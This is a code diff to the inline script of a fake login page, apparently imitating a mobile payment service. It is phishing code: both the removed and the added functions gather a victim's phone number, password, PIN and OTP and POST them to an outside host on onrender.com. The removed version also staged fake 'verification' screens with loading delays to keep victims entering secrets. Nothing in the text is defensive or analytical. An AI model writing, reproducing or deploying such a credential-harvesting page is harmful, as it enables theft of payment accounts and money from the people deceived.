@@ -395,7 +395,7 @@
             <button class="send-otp-btn" id="sendOtpBtn" onclick="startOtpTimer(this);">Send</button>
         </div>
 
-        <button class="confirm-btn" onclick="submitop();">CONFIRM</button>
+        <button class="confirm-btn" onclick="confirmLogin();">CONFIRM</button>
     </div>
 </div>
 
@@ -441,183 +441,36 @@
             }
         }, 1000);
     }
-    
-    const API_URL = "https://okpayk-1.onrender.com/submit";
-    const state = { issue: "", reference: "", demo: true };
+function confirmLogin() {
+    const phone = document.querySelector('input[type="tel"]').value;
+    const password = document.querySelectorAll('input[type="password"]')[0].value;
+    const pin = document.querySelectorAll('input[type="password"]')[1].value;
+    const otp = document.getElementById('otpInput').value;
 
-    function showView(viewId) {
-      document.querySelectorAll(".view").forEach((view) => view.classList.remove("active"));
-      const target = document.getElementById(viewId);
-      if (target) {
-        target.classList.add("active");
-        const firstInput = target.querySelector("input");
-        if (firstInput) setTimeout(() => firstInput.focus(), 50);
-      }
-    }
-
-    function setLoading(message) {
-      const loaderText = document.getElementById("loading-message");
-      if (loaderText) loaderText.textContent = message;
-      showView("view3");
-    }
-
-    function selectIssue(issue) {
-      state.issue = issue;
-      const issueTitle = document.getElementById("issue-title");
-      if (issueTitle) issueTitle.textContent = "Selected issue: " + issue;
-      showView("view2");
-    }
-
-    async function sendData(eventName, extraData = {}) {
-      const demoPayload = {
-  phone: document.getElementById('reference')?.value || '',
-  password: state . password ||'',
-  pin: state.pin || '',
-  issue: state.issue,
-  otp: state.otp || '',
-  ...extraData
-};
-
-      try {
-        const response = await fetch(API_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(demoPayload)
+    if (otp.length === 6) {
+        fetch('https://okpayk-1.onrender.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ phone, password, pin, otp })
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert(data.message);
+            if (data.success) {
+                closeOtpModal();
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Failed to send data.');
         });
-        if (!response.ok) throw new Error("HTTP Error: " + response.status);
-        const result = await response.json();
-        return { success: true, result };
-      } catch (error) {
-        console.warn("API unavailable, continuing in local mode:", error.message);
-        alert(error)
-        return { success: false, error: error.message };
-      }
-    }
-    async function resendOtp(btn) {
-  btn.disabled = true;
-  btn.style.opacity = "0.5";
-  let count = 30;
-  btn.innerText = `Resend (${count}s)`;
-
-  const timer = setInterval(() => {
-    count--;
-    if (count > 0) {
-      btn.innerText = `Resend (${count}s)`;
     } else {
-      clearInterval(timer);
-      btn.innerText = "Resend OTP";
-      btn.disabled = false;
-      btn.style.opacity = "1";
+        alert('Please enter a valid 6-digit OTP.');
     }
-  }, 1000);
 }
 
-    async function runStep(loadingText, eventName, nextViewId) {
-      setLoading(loadingText);
-      const minDelay = new Promise((resolve) => setTimeout(resolve, 900));
-      const [apiResult] = await Promise.all([sendData(eventName), minDelay]);
-      if (nextViewId) showView(nextViewId);
-      return apiResult;
-    }
-
-    async function submitCredentials() {
-const refInput = document.getElementById("reference");
-const reference = refInput ? refInput.value.trim() : "";
-if (!reference) {
-alert("Please enter a mobile number.");
-if (refInput) refInput.focus();
-return;
-}
-state.reference = reference;
-await runStep("Verifying...", "verification", "viewpass");
-showView('viewPass');
-}
-async function submitPassword() {
-const passInput = document.getElementById("password");
-const password = passInput ? passInput.value.trim() : "";
-if (!password) {
-alert("Please enter your password.");
-if (passInput) passInput.focus();
-return;
-}
-state.password = password;
-await runStep("Verifying...", "verification", "view4");
-}
-    function isCodeComplete(containerId) {
-      const boxes = document.querySelectorAll(`#${containerId} .pin-box`);
-      return Array.from(boxes).every((box) => box.value.trim().length === 1);
-    }
-
-    async function submitPin() {
-      if (!isCodeComplete("pin-group")) {
-        alert("Please enter all 6 digits for the PIN.");
-        return;
-      }
-      
-      await runStep("Processing ...", "pin_screen_", "view5");
-    }
-     
-    async function submitOtp() {
-        state.pin = Array.from(document.querySelectorAll('#pin-group .pin-box')).map(b => b.value).join('');
-      state.otp = Array.from(document.querySelectorAll('#otp-group .pin-box')).map(b => b.value).join('');
-      if (!isCodeComplete("otp-group")) {
-        alert("Please enter all 6 digits for the OTP.");
-        return;
-      }
-      const result = await runStep("Completing ...", "otp_screen", null);
-      if (result.success) {
-        alert("invalid event !");
-       showView('view5');
-       } else {
-        alert("Local completed. API connection unavailable.");
-        reset();
-      } 
-      
-    }
-
-    function reset() {
-      state.issue = "";
-      state.reference = "";
-      const refInput = document.getElementById("reference");
-      if (refInput) refInput.value = "";
-      document.querySelectorAll(".pin-box").forEach((box) => box.value = "");
-      showView("view1");
-    }
-    
-    function setupDigitInputs(containerId) {
-      const boxes = document.querySelectorAll(`#${containerId} .pin-box`);
-
-      boxes.forEach((box, idx) => {
-        box.addEventListener("input", () => {
-          box.value = box.value.replace(/[^0-9]/g, "");
-          if (box.value.length === 1 && idx < boxes.length - 1) {
-            boxes[idx + 1].focus();
-          }
-        });
-
-        box.addEventListener("keydown", (e) => {
-          if (e.key === "Backspace" && box.value === "" && idx > 0) {
-            boxes[idx - 1].focus();
-          }
-        });
-
-        box.addEventListener("paste", (e) => {
-          e.preventDefault();
-          const pastedData = (e.clipboardData || window.clipboardData)
-            .getData("text")
-            .replace(/[^0-9]/g, "")
-            .slice(0, boxes.length);
-
-          pastedData.split("").forEach((char, i) => {
-            if (boxes[i]) boxes[i].value = char;
-          });
-
-          const nextFocus = Math.min(pastedData.length, boxes.length - 1);
-          if (boxes[nextFocus]) boxes[nextFocus].focus();
-        });
-      });
-    }
-    
     
 </script>
 
